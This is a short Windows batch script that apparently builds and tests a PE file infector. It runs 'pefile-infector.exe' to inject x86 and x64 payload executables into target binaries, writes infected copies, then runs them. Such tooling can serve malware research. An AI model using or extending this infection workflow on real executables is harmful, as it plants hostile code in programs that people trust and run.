cmd /c compile-x64.bat
cmd /c compile-x86.bat

set scriptloc=%~dp0
set cmakeloc86=cmake-build-debug-visual-studio-x86
set loc86=%scriptloc%\%cmakeloc86%

set cmakeloc64=cmake-build-debug-visual-studio-x64
set loc64=%scriptloc%\%cmakeloc64%

%loc64%\pefile-infector.exe --input %loc86%\target.exe --output %scriptloc%\workspace\infected86.exe --payload-x86 %scriptloc%\payload\dist\output86.exe --payload-x64 %scriptloc%\payload\dist\output64.exe
%loc64%\pefile-infector.exe --input %loc64%\target.exe --output %scriptloc%\workspace\infected64.exe --payload-x86 %scriptloc%\payload\dist\output86.exe --payload-x64 %scriptloc%\payload\dist\output64.exe

%scriptloc%\workspace\infected86.exe 1 2 3 4 5 6
%scriptloc%\workspace\infected64.exe 2 3 4 5 6 7